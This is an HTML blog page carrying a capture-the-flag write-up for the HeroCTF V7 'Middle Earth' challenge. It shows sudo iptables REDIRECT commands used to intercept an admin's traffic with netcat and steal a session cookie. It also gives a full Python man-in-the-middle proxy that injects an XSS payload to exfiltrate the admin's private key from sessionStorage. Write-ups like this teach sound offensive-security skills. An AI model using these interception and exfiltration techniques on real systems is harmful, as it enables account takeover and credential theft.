@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/png" href="/favicon.png">
+    <title>HeroCTF V7 - Middle Earth - Trachinus Blog</title>
+    <link rel="stylesheet" href="/static/style.css?v=1764758284.073135">
+    <link rel="stylesheet" href="/static/syntax.css?v=1764758284.073135">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=Outfit:wght@500;700;800&family=Fira+Code:wght@400;500&display=swap"
+        rel="stylesheet">
+</head>
+
+<body>
+    <header class="header">
+        <div class="container header-content">
+            <a href="/index.html" class="logo">Trachinus</a>
+            <nav class="nav">
+                <a href="/index.html" class="nav-link">Home</a>
+                <a href="/writeups.html" class="nav-link">Writeups</a>
+                <div class="nav-actions">
+                    <button id="theme-toggle" class="icon-btn" title="Toggle Theme">
+                        <!-- Sun Icon -->
+                        <svg class="sun-icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24"
+                            viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                            stroke-linecap="round" stroke-linejoin="round" style="display: none;">
+                            <circle cx="12" cy="12" r="5"></circle>
+                            <line x1="12" y1="1" x2="12" y2="3"></line>
+                            <line x1="12" y1="21" x2="12" y2="23"></line>
+                            <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                            <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                            <line x1="1" y1="12" x2="3" y2="12"></line>
+                            <line x1="21" y1="12" x2="23" y2="12"></line>
+                            <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                            <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                        </svg>
+                        <!-- Moon Icon -->
+                        <svg class="moon-icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24"
+                            viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                            stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                        </svg>
+                    </button>
+                    <button id="cursor-toggle" class="icon-btn" title="Toggle Cursor">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
+                            stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M3 3l7.07 16.97 2.51-7.39 7.39-2.51L3 3z"></path>
+                            <path d="M13 13l6 6"></path>
+                        </svg>
+                    </button>
+                </div>
+            </nav>
+        </div>
+    </header>
+
+    <main class="container">
+        
+<article class="post">
+    <header class="post-header">
+        <a href="/writeups.html" class="back-link">← Back to Writeups</a>
+        <h1 class="post-title-large">HeroCTF V7 - Middle Earth</h1>
+        <div class="post-meta-large">
+            2025-12-02
+            
+        </div>
+    </header>
+
+    <div class="markdown-body">
+        <p>This challenge was a joint solve between Trachinus and I.</p>
+<p>It was mainly a system challenge, but also contained an important web application.</p>
+<p><img alt="" src="/static/img/system_chall_netowrk_chall.jpg" title="600px" /></p>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<p>We were given the credentials <strong>aragorn:hobbit</strong>, which we could use for both the web application and the SSH connection to the machine.</p>
+<p>We were also told that the admin user <strong>Saruman</strong> would login often using his administrator account.</p>
+<p>The webapp allows us to receive encrypted messages, which we can then decrypt using our private key.</p>
+<p>Contained in the login page is a small code block that generates our public/private key pair. </p>
+<div class="codehilite"><pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">crypt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">JSEncrypt</span><span class="p">({</span><span class="w"> </span><span class="nx">default_key_size</span><span class="o">:</span><span class="w"> </span><span class="mf">2048</span><span class="w"> </span><span class="p">});</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">privateKey</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">crypt</span><span class="p">.</span><span class="nx">getPrivateKey</span><span class="p">();</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">publicKey</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">crypt</span><span class="p">.</span><span class="nx">getPublicKey</span><span class="p">();</span>
+
+<span class="nx">sessionStorage</span><span class="p">.</span><span class="nx">setItem</span><span class="p">(</span><span class="s1">&#39;sessionPrivateKey&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">privateKey</span><span class="p">);</span>
+<span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;publicKey&#39;</span><span class="p">).</span><span class="nx">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">publicKey</span><span class="p">;</span>
+</code></pre></div>
+
+<p>When we log in, our private key is stored in the sessionStorage, whilst the public key is sent as a POST parameter:</p>
+<div class="codehilite"><pre><span></span><code><span class="nf">POST</span> <span class="nn">/login</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">dyn01.heroctf.fr:11267</span>
+<span class="err">...</span>
+username=aragorn&amp;password=hobbit&amp;publicKey=-----BEGIN+PUBLIC+KEY-----...-----END+PUBLIC+KEY-----
+</code></pre></div>
+
+<p>The public key is then reflected in the inbox page, whilst also being stored in the user session:</p>
+<p>We can then request a new message, and decrypt it client side using the JSEncrypt library:</p>
+<div class="codehilite"><pre><span></span><code><span class="nf">POST</span> <span class="nn">/request_encrypted</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">dyn01.heroctf.fr:11267</span>
+<span class="err">...</span>
+Cookie: session=.eJwlzjsOwjAMANC7eGaIk9iOe5kq8UdlbemEuDtIvBO8N-x5xnXA9jrveMD-dNiARnHNSA-S4JAo5mv01TVRybAHLmY31aI8tMRia9w4QklUasOUOkSniZDXMCNP557i1XRWx9k0W3YtzF3JjSQbzrQ5-0KBX-S-4vxvKny-CJMwFA.aS8hYg.OL3mn865Tf1HEt9LsvFBessLau0
+
+
+{&quot;flag&quot;:false}
+</code></pre></div>
+
+<p>Take into account here that the flag can only be requested when we have an admin account, which is currently not the case.</p>
+<h2 id="exploitation">Exploitation</h2>
+<p>After doing some quick recon on the server, we stumble across an iptables wrapper file that can be executed as root.</p>
+<div class="codehilite"><pre><span></span><code>aragorn@middle_earth:~$<span class="w"> </span>cat<span class="w"> </span>/opt/w_iptables.sh<span class="w"> </span>
+<span class="c1">#!/bin/bash</span>
+
+<span class="c1"># Validate and sanitize user input</span>
+<span class="nv">APPEND_OR_DELETE</span><span class="o">=</span><span class="nv">$1</span>
+<span class="nv">CHAIN</span><span class="o">=</span><span class="nv">$2</span>
+<span class="nv">PROTOCOL</span><span class="o">=</span><span class="nv">$3</span>
+<span class="nv">PORT_SRC</span><span class="o">=</span><span class="nv">$4</span>
+<span class="nv">PORT_DST</span><span class="o">=</span><span class="nv">$5</span>
+<span class="nv">ACTION</span><span class="o">=</span><span class="nv">$6</span>
+
+<span class="c1"># Define allowed chains, protocols, and actions</span>
+<span class="nv">ALLOWED_APPEND_OR_DELETE</span><span class="o">=(</span><span class="s2">&quot;A&quot;</span><span class="w"> </span><span class="s2">&quot;D&quot;</span><span class="o">)</span>
+<span class="nv">ALLOWED_CHAINS</span><span class="o">=(</span><span class="s2">&quot;INPUT&quot;</span><span class="w"> </span><span class="s2">&quot;OUTPUT&quot;</span><span class="w"> </span><span class="s2">&quot;FORWARD&quot;</span><span class="w"> </span><span class="s2">&quot;PREROUTING&quot;</span><span class="w"> </span><span class="s2">&quot;POSTROUTING&quot;</span><span class="o">)</span>
+<span class="nv">ALLOWED_PROTOCOLS</span><span class="o">=(</span><span class="s2">&quot;tcp&quot;</span><span class="w"> </span><span class="s2">&quot;udp&quot;</span><span class="o">)</span>
+<span class="nv">ALLOWED_ACTIONS</span><span class="o">=(</span><span class="s2">&quot;ACCEPT&quot;</span><span class="w"> </span><span class="s2">&quot;DROP&quot;</span><span class="w"> </span><span class="s2">&quot;REJECT&quot;</span><span class="w"> </span><span class="s2">&quot;MASQUERADE&quot;</span><span class="w"> </span><span class="s2">&quot;REDIRECT&quot;</span><span class="o">)</span>
+
+<span class="c1"># blacklist logic here</span>
+
+<span class="c1"># Build and execute the iptables command based on action</span>
+<span class="k">if</span><span class="w"> </span><span class="o">[[</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$ACTION</span><span class="s2">&quot;</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s2">&quot;REDIRECT&quot;</span><span class="w"> </span><span class="o">]]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
+<span class="w">    </span>/usr/sbin/iptables<span class="w"> </span>-t<span class="w"> </span>nat<span class="w"> </span>-<span class="nv">$APPEND_OR_DELETE</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$CHAIN</span><span class="s2">&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PROTOCOL</span><span class="s2">&quot;</span><span class="w"> </span>--dport<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PORT_SRC</span><span class="s2">&quot;</span><span class="w"> </span>-j<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$ACTION</span><span class="s2">&quot;</span><span class="w"> </span>--to-ports<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PORT_DST</span><span class="s2">&quot;</span>
+<span class="w">    </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;Redirect rule added successfully: /usr/sbin/iptables -t nat -</span><span class="nv">$APPEND_OR_DELETE</span><span class="s2">  </span><span class="nv">$CHAIN</span><span class="s2"> -p </span><span class="nv">$PROTOCOL</span><span class="s2"> --dport </span><span class="nv">$PORT_SRC</span><span class="s2"> -j </span><span class="nv">$ACTION</span><span class="s2"> --to-ports </span><span class="nv">$PORT_DST</span><span class="s2">&quot;</span>
+<span class="k">elif</span><span class="w"> </span><span class="o">[[</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$ACTION</span><span class="s2">&quot;</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s2">&quot;MASQUERADE&quot;</span><span class="w"> </span><span class="o">]]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
+<span class="w">    </span>/usr/sbin/iptables<span class="w"> </span>-t<span class="w"> </span>nat<span class="w"> </span>-<span class="nv">$APPEND_OR_DELETE</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$CHAIN</span><span class="s2">&quot;</span><span class="w"> </span>-j<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$ACTION</span><span class="s2">&quot;</span>
+<span class="w">    </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;Masquerade rule added successfully: /usr/sbin/iptables -t nat -</span><span class="nv">$APPEND_OR_DELETE</span><span class="s2">  </span><span class="nv">$CHAIN</span><span class="s2"> -j </span><span class="nv">$ACTION</span><span class="s2">&quot;</span>
+<span class="k">else</span>
+<span class="w">    </span>/usr/sbin/iptables<span class="w"> </span>-<span class="nv">$APPEND_OR_DELETE</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$CHAIN</span><span class="s2">&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PROTOCOL</span><span class="s2">&quot;</span><span class="w"> </span>--dport<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PORT_SRC</span><span class="s2">&quot;</span><span class="w"> </span>-j<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$ACTION</span><span class="s2">&quot;</span>
+<span class="w">    </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;Rule added successfully: /usr/sbin/iptables -</span><span class="nv">$APPEND_OR_DELETE</span><span class="s2">  </span><span class="nv">$CHAIN</span><span class="s2"> -p </span><span class="nv">$PROTOCOL</span><span class="s2"> --dport </span><span class="nv">$PORT_SRC</span><span class="s2"> -j </span><span class="nv">$ACTION</span><span class="s2">&quot;</span>
+</code></pre></div>
+
+<p>This script basically allows us to add and remove iptables rules, including <strong>NAT REDIRECT</strong> (which will be very useful), as long as the chosen ports are within the allowed range (1-2000).</p>
+<p>Thus, the fact that we can modify iptables rules, as well as the fact that the admin user regularly uses the webapp, will allow us to act as a proxy and intercept the traffic between the admin and the backend.</p>
+<h3 id="intercepting-the-cookie">Intercepting the Cookie</h3>
+<p>We need two things to be able to obtain the flag, a valid admin session cookie, as well as the admin's private key.</p>
+<p>Lets start with the cookie; its as simple as intercepting a POST request from the admin to the backend.</p>
+<p><img alt="" src="/static/img/client_request_you_shall_not_pass.jpg" /></p>
+<p>First, we need to add 2 iptables rules that will redirect traffic from the original web application port (80), to a port we control:</p>
+<div class="codehilite"><pre><span></span><code>sudo<span class="w"> </span>/opt/w_iptables.sh<span class="w"> </span>A<span class="w"> </span>PREROUTING<span class="w"> </span>tcp<span class="w"> </span><span class="m">80</span><span class="w"> </span><span class="m">1337</span><span class="w"> </span>REDIRECT
+sudo<span class="w"> </span>/opt/w_iptables.sh<span class="w"> </span>A<span class="w"> </span>OUTPUT<span class="w"> </span>tcp<span class="w"> </span><span class="m">80</span><span class="w"> </span><span class="m">1337</span><span class="w"> </span>REDIRECT
+</code></pre></div>
+
+<p>Then, we simply need to start a netcat on port 1337, and wait:</p>
+<div class="codehilite"><pre><span></span><code>nc<span class="w"> </span>-lnvkp<span class="w"> </span><span class="m">1337</span>
+
+POST<span class="w"> </span>/request_encrypted<span class="w"> </span>HTTP/1.1
+Host:<span class="w"> </span>middle_earth
+...
+Cookie:<span class="w"> </span><span class="nv">session</span><span class="o">=</span>.eJwlzjEOwzAIAMC_MHewwcaQz0TYgNo1aaaqf2-krjfdB_Y84nzC9j6ueMD-ctggw6uqZ51ZmupAi2xt2G3cjCx4mFArQmlIrFkUZ0dE4SG8mk4Ka70HEvbBtmyuWWWVxVY7CUmuNO7hUkJ4pmcZy72nqHIK3JHrjOO_qfD9AdIhL9A.aSs6aQ.0zSP4OkJW9rMGUkhvBSCUfHLkoo
+
+<span class="o">{</span><span class="s2">&quot;flag&quot;</span>:true<span class="o">}</span>
+</code></pre></div>
+
+<p>Now we need to revert the iptables rules that we just changed to make sure that the webapp works as it should:</p>
+<div class="codehilite"><pre><span></span><code>sudo<span class="w"> </span>/opt/w_iptables.sh<span class="w"> </span>D<span class="w"> </span>PREROUTING<span class="w"> </span>tcp<span class="w"> </span><span class="m">80</span><span class="w"> </span><span class="m">1337</span><span class="w"> </span>REDIRECT
+sudo<span class="w"> </span>/opt/w_iptables.sh<span class="w"> </span>D<span class="w"> </span>OUTPUT<span class="w">     </span>tcp<span class="w"> </span><span class="m">80</span><span class="w"> </span><span class="m">1337</span><span class="w"> </span>REDIRECT
+</code></pre></div>
+
+<h3 id="exfiltrating-the-private-key">Exfiltrating the Private Key</h3>
+<p>Next up is the admin's private key, which is slightly more complicated. One thing we noticed whilst auditing the webapp, was that a self XSS was possible via this function:</p>
+<div class="codehilite"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">displayMsg</span><span class="p">(</span><span class="nx">content</span><span class="p">,</span><span class="w"> </span><span class="nx">encrypted</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">inbox</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;inbox&#39;</span><span class="p">);</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">inbox</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s1">&#39;p.text-gray-500&#39;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">inbox</span><span class="p">.</span><span class="nx">innerHTML</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">;</span><span class="w"> </span><span class="c1">// Clear the &quot;empty&quot; message</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="nx">msgCounter</span><span class="o">++</span><span class="p">;</span>
+<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">msgId</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sb">`msg-content-</span><span class="si">${</span><span class="nx">msgCounter</span><span class="si">}</span><span class="sb">`</span><span class="p">;</span>
+
+<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">msgDiv</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">&#39;div&#39;</span><span class="p">);</span>
+<span class="w">    </span><span class="nx">msgDiv</span><span class="p">.</span><span class="nx">className</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;bg-gray-700 p-4 rounded-lg&#39;</span><span class="p">;</span>
+
+<span class="w">    </span><span class="c1">// Conditionally generate the button and other text based on the &#39;encrypted&#39; flag</span>
+<span class="w">    </span><span class="nx">msgDiv</span><span class="p">.</span><span class="nx">innerHTML</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sb">`</span>
+<span class="sb">        &lt;div class=&quot;flex justify-between items-start&quot;&gt;</span>
+<span class="sb">            &lt;div&gt;</span>
+<span class="sb">                &lt;h3 class=&quot;font-bold&quot;&gt;New Encrypted Message&lt;/h3&gt;</span>
+<span class="sb">                &lt;p class=&quot;text-sm text-gray-400&quot;&gt;From: server@secure.mail&lt;/p&gt;</span>
+<span class="sb">            &lt;/div&gt;</span>
+<span class="sb">            &lt;button </span>
+<span class="sb">                class=&quot;decrypt-btn bg-green-600 hover:bg-green-700 text-white text-xs font-bold py-1 px-3 rounded&quot; data-target=&quot;</span><span class="si">${</span><span class="nx">msgId</span><span class="si">}</span><span class="sb">&quot;&gt;Decrypt</span>
+<span class="sb">            &lt;/button&gt;</span>
+<span class="sb">        &lt;/div&gt;</span>
+<span class="sb">        &lt;pre id=&quot;</span><span class="si">${</span><span class="nx">msgId</span><span class="si">}</span><span class="sb">&quot; class=&quot;bg-gray-900 p-2 mt-2 rounded overflow-x-auto text-sm text-green-400&quot;&gt;</span><span class="si">${</span><span class="nx">content</span><span class="si">}</span><span class="sb">&lt;/pre&gt;</span>
+<span class="sb">    `</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">inbox</span><span class="p">.</span><span class="nx">prepend</span><span class="p">(</span><span class="nx">msgDiv</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>This function takes the encrypted message content and directly inserts it into the page’s HTML. This means that if we send a crafted response using our previous MitM, we can trigger the XSS on the admin's page, and exfiltrate its sessionStorage.</p>
+<p>We created a simple script that would intercept the admin's request, craft a malicious response, and exfiltrate the sessionStorage.</p>
+<p>We need to set our iptables rule first, before executing the python script:</p>
+<div class="codehilite"><pre><span></span><code>sudo<span class="w"> </span>/opt/w_iptables.sh<span class="w"> </span>A<span class="w"> </span>PREROUTING<span class="w"> </span>tcp<span class="w"> </span><span class="m">80</span><span class="w"> </span><span class="m">1337</span><span class="w"> </span>REDIRECT
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">socket</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">threading</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">re</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">urllib.parse</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">json</span>  
+
+
+<span class="n">LISTEN_PORT</span> <span class="o">=</span> <span class="mi">1337</span>
+<span class="n">TARGET_IP</span> <span class="o">=</span> <span class="s2">&quot;127.0.0.1&quot;</span>
+<span class="n">TARGET_PORT</span> <span class="o">=</span> <span class="mi">80</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">handle_client</span><span class="p">(</span><span class="n">client_socket</span><span class="p">):</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">request</span> <span class="o">=</span> <span class="n">client_socket</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8192</span><span class="p">)</span>
+
+        <span class="c1"># --- PHASE 2: RECEIVE THE KEY ---</span>
+        <span class="k">if</span> <span class="sa">b</span><span class="s1">&#39;GET /pwn?key=&#39;</span> <span class="ow">in</span> <span class="n">request</span><span class="p">:</span>
+            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">[+] Key exfiltration.&quot;</span><span class="p">)</span>
+            <span class="n">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;key=([^&amp; ]+)&#39;</span><span class="p">,</span> <span class="n">request</span><span class="p">)</span>
+            <span class="k">if</span> <span class="n">match</span><span class="p">:</span>
+                <span class="n">encoded_key</span> <span class="o">=</span> <span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+                <span class="n">private_key</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">unquote</span><span class="p">(</span><span class="n">encoded_key</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+                <span class="nb">print</span><span class="p">(</span><span class="n">private_key</span><span class="p">)</span>
+
+            <span class="n">client_socket</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;HTTP/1.1 200 OK</span><span class="se">\r\n</span><span class="s2">Access-Control-Allow-Origin: *</span><span class="se">\r\n\r\n</span><span class="s2">&quot;</span><span class="p">)</span>
+            <span class="k">return</span>
+
+        <span class="c1"># --- PHASE 1: PROXY REQUEST ---</span>
+        <span class="n">server_socket</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+        <span class="n">server_socket</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">TARGET_IP</span><span class="p">,</span> <span class="n">TARGET_PORT</span><span class="p">))</span>
+        <span class="n">server_socket</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">request</span><span class="p">)</span>
+
+        <span class="n">full_response</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;&quot;</span>
+        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+            <span class="n">chunk</span> <span class="o">=</span> <span class="n">server_socket</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
+            <span class="k">if</span> <span class="ow">not</span> <span class="n">chunk</span><span class="p">:</span>
+                <span class="k">break</span>
+            <span class="n">full_response</span> <span class="o">+=</span> <span class="n">chunk</span>
+        <span class="n">server_socket</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+        <span class="c1"># --- INJECTION ---</span>
+        <span class="k">if</span> <span class="sa">b</span><span class="s1">&#39;encrypted_content&#39;</span> <span class="ow">in</span> <span class="n">full_response</span><span class="p">:</span>
+
+
+            <span class="c1"># 1. Log the real ciphertext (Bot&#39;s Flag)</span>
+            <span class="n">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&quot;encrypted_content&quot;:&quot;([^&quot;]+)&quot;&#39;</span><span class="p">,</span> <span class="n">full_response</span><span class="p">)</span>
+            <span class="k">if</span> <span class="n">match</span><span class="p">:</span>
+                <span class="n">real_cipher</span> <span class="o">=</span> <span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Ciphertext captured (len=</span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">real_cipher</span><span class="p">)</span><span class="si">}</span><span class="s2">)&quot;</span><span class="p">)</span>
+                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Save this: </span><span class="si">{</span><span class="n">real_cipher</span><span class="p">[:</span><span class="mi">50</span><span class="p">]</span><span class="si">}</span><span class="s2">...&quot;</span><span class="p">)</span> 
+
+            <span class="c1"># 2. Create the Malicious Payload</span>
+
+
+            <span class="n">xss_payload</span> <span class="o">=</span> <span class="p">(</span>
+                <span class="s2">&quot;&lt;img src=x onerror=&#39;fetch(</span><span class="se">\&quot;</span><span class="s2">/pwn?key=</span><span class="se">\&quot;</span><span class="s2">+encodeURIComponent(sessionStorage.getItem(</span><span class="se">\&quot;</span><span class="s2">sessionPrivateKey</span><span class="se">\&quot;</span><span class="s2">)))&#39; &gt;&quot;</span>
+            <span class="p">)</span>
+
+            <span class="n">new_json_body</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span><span class="s2">&quot;encrypted_content&quot;</span><span class="p">:</span> <span class="n">xss_payload</span><span class="p">})</span>
+
+            <span class="c1"># 3. Rebuild the HTTP Response</span>
+            <span class="k">if</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\r\n\r\n</span><span class="s1">&#39;</span> <span class="ow">in</span> <span class="n">full_response</span><span class="p">:</span>
+                <span class="n">headers</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">full_response</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\r\n\r\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+
+
+                <span class="n">new_len</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">new_json_body</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+                <span class="n">headers</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Content-Length: \d+&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;Content-Length: &#39;</span> <span class="o">+</span> <span class="n">new_len</span><span class="p">,</span> <span class="n">headers</span><span class="p">)</span>
+
+                <span class="n">full_response</span> <span class="o">=</span> <span class="n">headers</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\r\n\r\n</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">new_json_body</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+
+        <span class="n">client_socket</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">full_response</span><span class="p">)</span>
+
+    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Error: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="k">finally</span><span class="p">:</span>
+        <span class="n">client_socket</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">start_server</span><span class="p">():</span>
+    <span class="n">server</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+    <span class="n">server</span><span class="o">.</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+    <span class="n">server</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">LISTEN_PORT</span><span class="p">))</span>
+    <span class="n">server</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+        <span class="n">client</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">server</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>
+        <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">handle_client</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">client</span><span class="p">,))</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+    <span class="n">start_server</span><span class="p">()</span>
+</code></pre></div>
+
+<h2 id="flag">Flag</h2>
+<p>And there we go, the admin's private key:</p>
+<p><strong>-----BEGIN RSA PRIVATE KEY-----shortenend here for readability-----END RSA PRIVATE KEY-----</strong></p>
+<p><img alt="" src="/static/img/precious_session_storage.jpeg" title="600px" /></p>
+<p>We simply need to replace our current private key with the one we just exfiltrated, replace our session cookie with the admin's, request our FLAG, and finally decrypt it!</p>
